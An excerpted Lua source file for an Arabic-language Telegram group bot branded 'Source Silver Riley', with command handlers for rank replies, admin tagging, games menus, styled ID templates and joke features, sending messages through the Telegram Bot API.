https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/SourceRiley/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SourceRiley/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
database:set(bot_id.."SourceRiley:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."SourceRiley:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SourceRiley:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."SourceRiley:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_," 🌏تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."SourceRiley:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."SourceRiley:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سيلفر رايلييعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سيلفر رايلي').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه رايلي ') 
return false
end
...
DRAGON:set(DRAGON..'DR:viewget'..msg.sender_user_id_,true)
DRAGON(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🌏♥️](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SourceRiley)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌏](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..🌏💕](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/SourceRiley)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضحكك اهو ..🌏💕](t.me/SourceRiley)')
return false
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SourceRiley')..')'
local iduser = result.sender_user_id_
...
[[
🌨𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘Use ⇨ #username 🌨
🌨𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘iD ⇨ #id 🌨
??𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘Sta ⇨  #stast 🌨
🌨𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘Msg ⇨ #msgs 🌨
🌨𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 🌏  
↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast 🌏  
↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𝙈𝘼𝙎𝙂 ➱ #msgs 🌏  
↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝@SourceRiley↜ 🌏  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
🌏 𝟔 𖡻 #msgs  ࿇🦄
...
send(msg.chat_id_,msg.id_,'\n 🌏 اهلا عزيزي البوت هنا ادمن'..'\n 🌏 وصلاحياته هي 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘 \n━━━━━━━━━━'..'\n 🌏 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 🌏 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 🌏 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 🌏 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 🌏 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 🌏 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
[🎯ألعاب سورس سيلفر رايلي الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)
]]
keyboard = {} 
...
local text = msg.content_.text_
if text == 'العاب' and database:get(bot_id..'Lock:Games'..msg.chat_id_) then
if AddChannel(msg.sender_user_id_) == false then
...
Text_Games = [[
《𝚆𝙴𝙻𝙲𝙾𝙼 𝙸𝙽 𝘴𝘪𝘭𝘷𝘦𝘳 𝘳𝘪𝘭𝘦𝘺 𝙶𝙰𝙼𝙴𝚂🎮》
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
✰مرحب بيك في قائمه العاب سورس سيلفر رايلي🎮
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
...
if text == 'العاب السورس' or text == 'العاب' then
local Text = [[
《𝚆𝙴𝙻𝙲𝙾𝙼 𝙸𝙽 𝘴𝘪𝘭𝘷𝘦𝘳 𝘳𝘪𝘭𝘦𝘺 𝙶𝙰𝙼𝙴𝚂🎮》
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
...
✰اوامر العاب كتالي 
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
 ✰تفعيل العاب ⇐ لتفعيل العبه ◐
 ✰تعطيل العاب ⇐ لتعطيل العبه ◐
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
 ✰العاب الخاصه بسورس سيلفر رايلي
≪━━━━━━⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧━━━━━━≫
...
𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
 🌏اوامر مسح / المسح ← امر
𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
 🌏مسح + امر 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
 🌏الايدي 
 🌏المميزين
 🌏الادمنيه
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
 اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳ 
]]
keyboard = {} 
...
local Teext =[[
 ...
 تحت لي في الزر الأسفل𖣘━┅┄⟞⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧⟝┄┉━𖣘
...
local Teext =[[
 🌏مرحب  بك في مميزات سورس سيلفر رايلي 🌏
 🌏 مميزات الخاصه بسورس 🌏
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[˹《𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗜𝗟𝗩𝗘𝗥 𝗥𝗜𝗟𝗘𝗬 𖠛 𖠗》˼ ](t.me/SourceRiley)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سيلفر رايلي')
...
if text == "نسبه الغباء" or text == "نسبه الغبا" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه غباءه \n مثال يوسف'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الغباء" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
